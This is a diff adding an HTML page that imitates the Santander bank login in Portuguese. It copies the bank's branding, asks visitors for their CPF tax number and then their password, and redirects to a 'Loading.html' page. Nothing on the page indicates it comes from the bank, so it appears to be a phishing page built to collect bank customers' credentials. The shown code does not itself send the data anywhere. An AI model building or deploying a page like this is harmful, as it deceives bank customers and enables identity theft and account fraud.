@@ -1,0 +1,246 @@
+ <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Santander</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://db.onlinewebfonts.com/c/65bbf843c200ca74fbd6abe228aa7874?family=Santander+Text+W05+Light" rel="stylesheet" type="text/css"/>
+  <style>
+    /* Seu estilo permanece o mesmo */
+  body {
+  font-family: 'Santander Text W05 Light', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #fff;
+  color: #333;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+}
+
+.header {
+  background-color: #EC0000;
+  padding: 3px;
+  display: flex;
+  justify-content: left ; /* Centraliza o logo horizontalmente *
+  align-items: center;    /* Mantém a altura do logo */
+}
+
+.header img {
+  height: 60px;
+}
+
+.container {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: flex-start;
+  align-items: center;
+  padding: 15px;
+  background-color: #ffffff;
+}
+
+.container h1 {
+  font-size: 20px;
+  color: #333;
+  margin-top: 8px;
+  margin-bottom: 5px;
+  text-align: left;
+  width: 100%;
+}
+
+.container p {
+  font-size: 14px;
+  color: #666;
+  margin-top: 0;
+  margin-bottom: 15px;
+  text-align: left;
+  width: 100%;
+}
+
+.input-container {
+  position: relative;
+  width: 100%;
+  max-width: 315px;
+  margin-top: 55px;
+  margin-bottom: 15px;
+}
+
+.input-container input {
+  width: 100%;
+  padding: 13px;
+  font-size: 16px;
+  border: 1px solid #989898;
+  border-radius: 3px;
+  box-sizing: border-box;
+}
+
+.input-container input:focus {
+  border-color: #767676;
+  outline: none;
+}
+
+.input-container i {
+  position: absolute;
+  right: 10px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #EC0000;
+  font-size: 16px;
+  display: none;
+}
+
+.input-container.error i {
+  display: inline;
+}
+
+.input-container.error input {
+  border-color: #EC0000;
+}
+
+.button-container {
+  width: 100%;
+  max-width: 400px;
+  margin-top: 370px;
+}
+
+.divider {
+  width: 100%;
+  max-width: 400px;
+  height: 1px;
+  background-color: #ddd;
+  margin-bottom: 20px;
+  margin-top: -30px;
+}
+
+.button-container button {
+  width: 100%;
+  padding: 17px;
+  font-size: 16px;
+  background-color: #ccc;
+  border: none;
+  border-radius: 7px;
+  color: #fff;
+  cursor: not-allowed;
+  transition: background-color 0.3s;
+}
+
+.button-container button.active {
+  background-color: #EC0000;
+  cursor: pointer;
+}
+
+.button-container button:hover {
+  background-color: #C10000;
+}
+
+.footer {
+  padding: 10px;
+  text-align: center;
+  font-size: 12px;
+  color: #999;
+  background-color: #f9f9f9;
+}
+
+.footer a {
+  color: #EC0000;
+  text-decoration: none;
+}
+
+.footer a:hover {
+  text-decoration: underline;
+}
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img alt="Santander Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAAG1rQ6c3vMyzjilAoFUhQsYNjBXrmq6Txw&usqp=CAU"/>
+  </div>
+
+  <div class="container">
+    <h1 id="title">Acessar sua conta</h1>
+    <p id="instruction">Digite seu CPF para prosseguir com seu login.</p>
+
+    <div class="input-container" id="inputContainer">
+      <input id="cpf" placeholder="Insira seu CPF" type="text" maxlength="14" oninput="handleInput()" />
+      <i class="fas fa-exclamation-triangle"></i>
+    </div>
+
+    <div class="button-container">
+      <div class="divider"></div>
+      <button id="continueButton" onclick="nextStep()">Continuar</button>
+    </div>
+  </div>
+
+  <script>
+    let currentStep = "cpf"; // Controla a fase (CPF ou Senha)
+
+    // Função para formatar o CPF
+    function handleInput() {
+      const cpfInput = document.querySelector('#cpf');
+      const cpfContainer = document.querySelector('#inputContainer');
+      let cpf = cpfInput.value.replace(/\D/g, '');
+
+      // Remove a classe de erro ao digitar novamente
+      cpfContainer.classList.remove('error');
+
+      // Formata o CPF automaticamente
+      if (cpf.length <= 11) {
+        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+        cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
+        cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+      }
+
+      cpfInput.value = cpf;
+
+      // Habilitar o botão apenas se o CPF estiver completo
+      const button = document.querySelector('#continueButton');
+      if (cpf.length === 14) {
+        button.disabled = false;
+        button.classList.add('active');
+      } else {
+        button.disabled = true;
+        button.classList.remove('active');
+      }
+    }
+
+    // Função para avançar para o próximo passo
+    function nextStep() {
+      if (currentStep === "cpf") {
+        const cpfInput = document.querySelector('#cpf').value;
+        if (cpfInput.length === 14) {
+          currentStep = "senha";
+          document.querySelector('#title').innerText = "Insira sua senha";
+          document.querySelector('#instruction').innerText = `CPF: ${cpfInput}`;
+          document.querySelector('#inputContainer').innerHTML = '<input id="senha" type="password" placeholder="Digite sua senha" oninput="handleInputSenha()"/>';
+          document.querySelector('#continueButton').innerText = "Entrar";
+        } else {
+          alert("CPF inválido!");
+        }
+      } else if (currentStep === "senha") {
+        const senhaInput = document.querySelector('#senha').value;
+        if (senhaInput.length > 0) {
+          // Redireciona para outra página após o login
+          window.location.href = 'Loading.html'; // Substitua 'nova-pagina.html' pela URL desejada
+        } else {
+          alert("Por favor, insira a senha.");
+        }
+      }
+    }
+
+    // Função para verificar a senha
+    function handleInputSenha() {
+      const senhaInput = document.querySelector('#senha');
+      const button = document.querySelector('#continueButton');
+      if (senhaInput.value.length > 0) {
+        button.disabled = false;
+        button.classList.add('active');
+      } else {
+        button.disabled = true;
+        button.classList.remove('active');
+      }
+    }
+  </script>
+</body>
+</html>
